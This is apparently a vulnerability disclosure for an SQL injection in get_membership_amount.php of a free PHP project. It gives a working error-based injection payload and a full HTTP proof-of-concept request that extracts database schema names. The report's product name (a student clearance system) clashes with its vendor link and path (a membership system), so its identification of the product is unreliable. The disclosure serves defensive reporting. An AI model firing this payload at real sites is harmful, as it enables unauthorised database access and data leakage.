# SQLi-1

# Vulnerability Description

The Web-based Student Clearance System in PHP Free Source Code (It is an open source project from [https://codeastro.com/](https://codeastro.com/)) has SQL injection vulnerabilities, which can lead to database information leakage.

1. BUG_Author: Tr0e
2. vendors: https://codeastro.com/membership-management-system-in-php-with-source-code/;
3. The program is built using the PHP 7.3.4nts version;
4. Vulnerability location: /get_membership_amount.php

# Vulnerability Verification

[+] Payload:

```java
/get_membership_amount.php?membershipTypeId=-1+and+(updatexml(1,concat(0x7e,(select+schema_name+from+information_schema.schemata+limit+4,1),0x7e),1))--+
```

POC：

```js
GET /membership/get_membership_amount.php?membershipTypeId=-1+and+(updatexml(1,concat(0x7e,(select+schema_name+from+information_schema.schemata+limit+4,1),0x7e),1))--+ HTTP/1.1
Host: 127.0.0.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:122.0) Gecko/20100101 Firefox/122.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Cookie: PHPSESSID=04m7j5gs6vvmk9sh7s0fptra0o
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: none
Sec-Fetch-User: ?1


```

## How to verify

Build the vulnerability environment according to the steps provided by the source code author and execute the poc provided above：

​![image](assets/image-20240225145511-l0kkj0t.png)​

‍
